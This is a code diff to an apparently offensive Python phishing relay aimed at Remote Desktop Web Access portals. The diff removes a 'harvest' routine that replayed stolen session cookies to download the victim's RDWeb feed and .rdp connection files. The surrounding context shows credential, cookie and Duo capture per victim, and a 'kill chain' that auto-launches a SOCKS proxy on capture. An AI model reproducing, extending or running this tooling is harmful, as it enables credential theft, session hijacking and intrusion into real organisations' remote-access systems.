@@ -55,7 +55,6 @@ class Config:
     session_ttl: int = 3600
     no_killchain: bool = False
     socks_port_base: int = 1080
-    harvest: bool = True
     verbose: bool = False
 
     @property
@@ -95,14 +94,12 @@ def parse_args(argv=None):
     ap.add_argument("--cert", default="",
                     help="PEM file (cert+key); omit for self-signed fallback")
     ap.add_argument("--out", dest="out_dir", default="./rdrelay-data",
-                    help="output directory for sessions/certs/artifacts")
+                    help="output directory for sessions and certs")
     ap.add_argument("--session-ttl", type=int, default=3600)
     ap.add_argument("--no-killchain", action="store_true",
                     help="do NOT auto-spawn rdetour SOCKS on credential capture")
     ap.add_argument("--socks-port", type=int, default=1080,
                     help="base SOCKS port (each session gets base+n)")
-    ap.add_argument("--no-harvest", dest="harvest", action="store_false",
-                    help="do not replay cookies to harvest the feed")
     ap.add_argument("-v", "--verbose", action="store_true")
     a = ap.parse_args(argv)
 
@@ -122,7 +119,6 @@ def parse_args(argv=None):
         session_ttl=a.session_ttl,
         no_killchain=a.no_killchain,
         socks_port_base=a.socks_port,
-        harvest=a.harvest,
         verbose=a.verbose,
     )
 
@@ -313,13 +309,11 @@ class RelaySession:
             "victim_ip": None, "user_agent": None,
             "credentials": None, "auth_state": "none",
             "cookies": {}, "duo": {}, "events": [],
-            "harvest": {"feed_saved": False, "rdp_files": []},
             "killchain": None,
         }
         self.lock = threading.Lock()
         self.dir = os.path.join(store.dir, "sessions", self.sid)
         os.makedirs(self.dir, exist_ok=True)
-        os.makedirs(os.path.join(self.dir, "artifacts"), exist_ok=True)
 
     def event(self, kind, **kw):
         ev = {"ts": _utcnow(), "type": kind}
@@ -379,17 +373,6 @@ class RelaySession:
             d[name] = value
             self.save()
 
-    def artifact_path(self, name):
-        p = os.path.join(self.dir, "artifacts", name)
-        os.makedirs(os.path.dirname(p), exist_ok=True)
-        return p
-
-    def save_artifact(self, name, data):
-        if isinstance(data, str):
-            data = data.encode("utf-8", "replace")
-        with open(self.artifact_path(name), "wb") as f:
-            f.write(data)
-
     def save(self):
         self.store._save(self)
 
@@ -433,68 +416,6 @@ class SessionStore:
 # ---------------------------------------------------------------------------
 # Harvest
 # ---------------------------------------------------------------------------
-
-_RDP_LINK_RE = re.compile(
-    r"(/RDWeb/Pages/rdp/[^\s\"'<>&]+\.rdp)", re.IGNORECASE)
-
-
-async def _harvest_session(cfg, sess):
-    if not sess.data["cookies"]:
-        return False
-    cookie_hdr = sess.cookie_header()
-    base = cfg.upstream_origin
-    timeout = aiohttp.ClientTimeout(total=90, connect=15)
-    saved_rdps = []
-    conn = aiohttp.TCPConnector(ssl=False)
-    async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar(),
-                                     timeout=timeout, connector=conn) as c:
-        async with c.get(base + "/RDWeb/Pages/en-US/Default.aspx",
-                         headers={"Cookie": cookie_hdr},
-                         allow_redirects=False) as r:
-            if r.status in (301, 302):
-                loc = r.headers.get("Location", "")
-                if not loc.startswith("http"):
-                    loc = base + loc
-                async with c.get(loc, headers={"Cookie": cookie_hdr},
-                                 allow_redirects=False) as r2:
-                    r = r2
-            body = await r.text(errors="replace")
-            if r.status != 200 or "login.aspx" in r.url.path.lower():
-                _log("harvest", "sid=%s: feed fetch failed (HTTP %d)"
-                     % (sess.sid, r.status))
-                sess.event("harvest_failed", status=r.status)
-                return False
-            sess.save_artifact("feed.xml", body)
-            sess.data["harvest"]["feed_saved"] = True
-            _log("harvest", "sid=%s: feed saved (%d bytes)"
-                 % (sess.sid, len(body)))
-
-        for m in _RDP_LINK_RE.finditer(body):
-            u = urljoin(base + "/", m.group(1))
-            try:
-                async with c.get(u, headers={"Cookie": cookie_hdr},
-                                 allow_redirects=False) as rr:
-                    if rr.status != 200:
-                        continue
-                    txt = await rr.text(errors="replace")
-            except aiohttp.ClientError:
-                continue
-            name = u.rstrip("/").rsplit("/", 1)[-1]
-            sess.save_artifact(name, txt)
-            saved_rdps.append(name)
-            gw = None
-            gm = re.search(r"^gatewayhostname\s*:\s*s:(.+)$",
-                            txt, re.MULTILINE)
-            if gm:
-                gw = gm.group(1).strip()
-            _log("harvest", "sid=%s: saved %s (gw=%s)"
-                 % (sess.sid, name, gw))
-
-    sess.data["harvest"]["rdp_files"] = saved_rdps
-    sess.data["auth_state"] = "harvested"
-    sess.event("harvested", rdp_files=saved_rdps)
-    return True
-
 
 # ---------------------------------------------------------------------------
 # Kill chain
@@ -857,13 +778,10 @@ class RelayApp:
             return out
 
         rctype = resp.headers.get("Content-Type", "")
-        disp = resp.headers.get("Content-Disposition", "")
-        is_rdp = (request.path.lower().endswith(".rdp")
-                  or ".rdp" in disp.lower())
         is_text = any(rctype.lower().startswith(t) for t in REWRITE_TYPES)
 
         try:
-            if (is_text or is_rdp) and \
+            if is_text and \
                     int(resp.headers.get("Content-Length", "0")) <= MAX_BUFFER:
                 raw = _decompress(await resp.read(),
                                   resp.headers.get("Content-Encoding"))
@@ -916,11 +834,6 @@ class RelayApp:
 # ---------------------------------------------------------------------------
 
 async def _on_capture(sess, cfg, kc):
-    if cfg.harvest:
-        try:
-            await _harvest_session(cfg, sess)
-        except Exception as e:
-            _log("relay", "harvest error sid=%s: %r" % (sess.sid, e))
     try:
         await kc.arm(sess)
     except Exception as e:
